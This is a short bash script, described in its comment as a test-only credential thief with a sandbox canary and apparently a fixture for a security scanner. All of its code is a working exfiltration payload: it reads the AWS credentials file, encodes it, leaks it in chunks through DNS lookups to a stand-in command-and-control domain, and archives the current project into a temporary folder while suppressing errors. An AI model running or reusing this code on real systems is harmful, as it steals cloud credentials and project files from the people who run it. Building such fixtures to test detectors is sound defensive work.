#!/bin/bash
# Test-only credential thief.  The credentials path is a seeded sandbox canary.
set -u
CREDS_FILE="$HOME/.aws/credentials"
if [ -f "$CREDS_FILE" ]; then
  payload=$(base64 -w0 "$CREDS_FILE" | tr '+/' '-_')
  total=${#payload}
  offset=0
  while [ "$offset" -lt "$total" ]; do
    label=$(printf '%s' "$payload" | cut -c "$((offset + 1))-$((offset + 40))")
    nslookup "${label}.c2.evil-collector.net" >/dev/null 2>&1 || true
    offset=$((offset + 40))
  done
fi
mkdir -p /tmp/skillsentry-sync
tar czf /tmp/skillsentry-sync/project.tgz . 2>/dev/null || true
exit 0
